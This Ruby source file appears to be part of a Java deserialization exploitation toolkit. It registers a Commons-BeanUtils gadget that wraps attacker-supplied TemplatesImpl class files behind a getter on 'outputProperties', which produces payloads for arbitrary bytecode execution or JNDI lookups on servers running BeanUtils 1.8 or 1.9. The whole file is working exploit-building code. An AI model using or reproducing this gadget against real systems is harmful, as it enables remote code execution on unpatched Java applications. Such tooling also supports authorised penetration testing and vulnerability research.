require_relative '../payloads/beanutils'
require_relative '../payloads/templates'

class Beanutils < Java::Gadgets::Gadget
  def id
    'beanutils'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('beanutils')

    return false if !ctx.flag?('beanutils18') && !ctx.flag?('beanutils19')

    unless params.fetch('classfiles', nil).nil?
      # jdk templates + no secmgr
      # or xalan templates
      # required
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[bytecode jndi]
  end

  def create(ctx, params: {})
    if ctx.flag?('beanutils18')
      ctx.reg.load('model/beanutils-1.8.json')
    elsif ctx.flag?('beanutils19')
      ctx.reg.load('model/beanutils-1.9.json')
    end

    if !params.fetch('classfiles', nil).nil?
      Java::Serialize::Payloads::Beanutils.make_get_property(
        Java::Serialize::Payloads::Templates.make(ctx, params['classfiles']),
        'outputProperties'
      )
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Beanutils.new
)
